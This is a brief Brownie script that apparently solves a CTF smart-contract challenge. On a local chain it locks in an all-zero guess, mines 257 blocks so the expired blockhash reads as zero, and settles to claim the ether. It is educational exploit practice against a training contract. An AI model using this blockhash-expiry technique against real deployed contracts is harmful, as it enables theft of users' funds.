from brownie import PredictTheBlockHashChallenge, accounts, chain


def main():
    deployer = accounts[0]
    player = accounts[1]

    contract = PredictTheBlockHashChallenge.deploy(
        {'from': deployer, 'value': '1 ether'})

    contract.lockInGuess(b'\x00'*32, {'from': player, 'value': '1 ether'})
    chain.mine(257)
    contract.settle({'from': player})

    assert contract.isComplete() == True
